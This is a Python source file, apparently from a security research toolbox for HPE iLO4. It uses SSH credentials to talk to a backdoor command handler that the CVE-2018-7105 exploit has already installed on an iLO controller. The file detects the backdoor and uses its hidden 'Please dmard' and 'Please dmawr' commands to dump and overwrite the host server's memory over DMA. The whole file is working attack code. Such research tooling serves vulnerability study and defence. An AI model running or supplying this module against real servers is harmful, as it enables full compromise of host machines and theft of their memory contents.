#!/usr/bin/python

# Module using command handler installer by CVE-2018-7105 SSH exploit
# Courtesy of @IooNag
# Some code is reused from original exploit
# https://github.com/airbus-seclab/ilo4_toolbox/blob/master/scripts/iLO4/exploits/exploit_ssh.py

import paramiko
import time

class ModSSHExploit():

	def __init__(self, args):
		self.remote_addr = args.remote_addr
		self.verbose = args.verbose
		if args.user == '' or args.password == '':
			raise Exception("Module requires valid SSH credentials")
		self.user = args.user
		self.password = args.password
		self.port = args.port
		self.client = None


	def start(self):
		try:
			self.client = paramiko.client.SSHClient()
			self.client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)
			self.client.connect(self.remote_addr, self.port, username=self.user, password=self.password,
	               timeout=30, allow_agent=False, look_for_keys=False)
			self.channel = self.client.invoke_shell()
			self.channel.setblocking(0)
			if self.verbose:
				print "[+] Connected to %s port %d" % (self.remote_addr, self.port)
			self.recv_until_prompt()
			return True
		except Exception as e:
			print "Error: %s", e
			return False

	def stop(self):
		try:
			self.channel.close()
			self.client.close()
		except:
			pass
		if self.verbose:
			print "[*] Connection %s port %d has been closed" % (self.remote_addr, self.port)
		return True

	def recv_all(self):
    # Give iLO some time to process a command
	    time.sleep(.05)
	    result = b''
	    while self.channel.recv_ready():
	        result += self.channel.recv(4096)
	    return result

	def recv_force(self):
	    """force returning data"""
	    data = self.recv_all()
	    numiter = 0
	    while not data:
	        numiter += 1
	        if numiter <= 10:
	            time.sleep(.1)
	        elif numiter <= 20:
	            time.sleep(1)
	        else:
				raise Exception("Timeout")
	        data = self.recv_all()
	    return data

	def recv_until_prompt(self):
	    """receive data until a CLI prompt"""
	    data = self.recv_force()
	    while b'hpiLO' not in data:
	        data += self.recv_force()
	    return data

	def sr(self,data):
	    """send and receive"""
	    self.channel.send(data)
	    return self.recv_force()

	def srp(self,data):
	    """send and receive data until a CLI prompt"""
	    self.channel.send(data)
	    return self.recv_until_prompt()

	def send_command(self, cmd):
		output = self.srp(cmd + b'\r')
		# Find the prompt repetition in the output, which may be inside the output
		# (due to buffer sync issues)
		cmdindex = output.index(cmd)
		output_prefix = output[:cmdindex].lstrip(b'\r\n')
		output = output_prefix + output[cmdindex + len(cmd):].lstrip(b'\r\n')
		# Drop the prompt
		output = output[:output.rindex(b'hpiLO')].rsplit(b'\n', 1)[0]
		return output.strip(b'\r\n')

	def status(self):
		res = self.detect_backdoor()
		if not res and self.verbose:
			print "[-] SSH special handler not found. Please, run the SSH exploit first"
			print "\thttps://github.com/airbus-seclab/ilo4_toolbox/blob/master/scripts/iLO4/exploits/exploit_ssh.py"
		return res

	def detect_backdoor(self):
		return "Usage: Please COMMAND" in self.send_command("Please help")

	def parse_dmard(self, cmd_output, expected_addr):
		data = ""
		for line in cmd_output.decode('ascii').splitlines():
			if ':' in line:
				textaddr, textdata = line.split(':', 1)
				addr = int(textaddr, 16)
				if addr != expected_addr + len(data):
					if self.verbose:
						print "[-] Unexpected address: %#x != %#x+%#x" % (addr, expected_addr, len(data))
						return ""
				data += textdata.decode("hex")
		return data

	def dump_memory_chunk(self, addr, count):
		start=time.time()
		if self.verbose:
			print "[*] Chunk dump of %08x bytes at %016x" % (count, addr)
		prepared_cmd = "Please dmard 1 %x %x" % (addr, count)
		output = self.send_command(prepared_cmd)
		raw_data = self.parse_dmard(output, addr)
		if self.verbose:
			print "[+] Chunk dump OK in",(time.time()-start),"%x bytes" % len(raw_data)
		return raw_data

	def dump_memory(self, addr, count):
		start=time.time()
		raw_data = ""
		print "[*] Asked dump of %08x bytes at %016x" % (count, addr)
		for x in xrange(0, count, 0x1000):
			raw_data += self.dump_memory_chunk(addr+x, 0x1000)
		print "[+] Dump OK in",(time.time()-start),"%x bytes" % len(raw_data)
		return raw_data

	# Limited by design
	def write_memory_chunk(self, addr, data):
		start=time.time()
		if self.verbose:
			print "[*] Write 0x%x @%016x" % (len(data),addr)
		prepared_cmd = "Please dmawr 1 %x %x %s" % (addr, len(data), data.encode("hex"))
		output = self.send_command(prepared_cmd)
		if self.verbose:
			print "[+] Write 0x%x in" % len(data),(time.time()-start)
		return ""

	def write_memory(self, addr, data):
		start=time.time()
		print "[*] Asked write of %08x bytes at %016x" % (len(data), addr)
		wdata = ""
		for x in xrange(0, len(data), 0x40):
			wdata += self.write_memory_chunk(addr+x, data[x:x+0x40])
		print "[+] Write done in",(time.time()-start)
		return wdata

